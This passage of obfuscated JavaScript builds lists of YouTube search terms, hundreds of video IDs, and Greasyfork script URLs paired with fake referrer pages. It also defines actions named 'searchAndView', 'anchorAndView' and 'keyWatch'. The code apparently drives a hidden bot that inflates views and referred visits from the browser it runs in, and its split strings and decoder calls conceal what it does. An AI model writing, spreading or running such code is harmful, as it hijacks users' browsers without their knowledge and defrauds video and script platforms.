'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x2624 + 0x598 * -0x6 + 0x6 * 0xbf5)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x19d6 + 0x1 * -0x1d6d + 0x3a1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x2 * -0xb66 + -0x1 * 0x22ed + 0x5 * 0xb8c);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    V(0x0) + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    V(0x12) + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    W(0x14) + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    U(0x13, 'bpiv') + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    W(0x8) + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    W(0xe) + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    U(0x7, 'fkLK') + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    W(0x16) + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    V(0xc) + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + U(0x6, 'r!@e') + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + V(0xb) + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
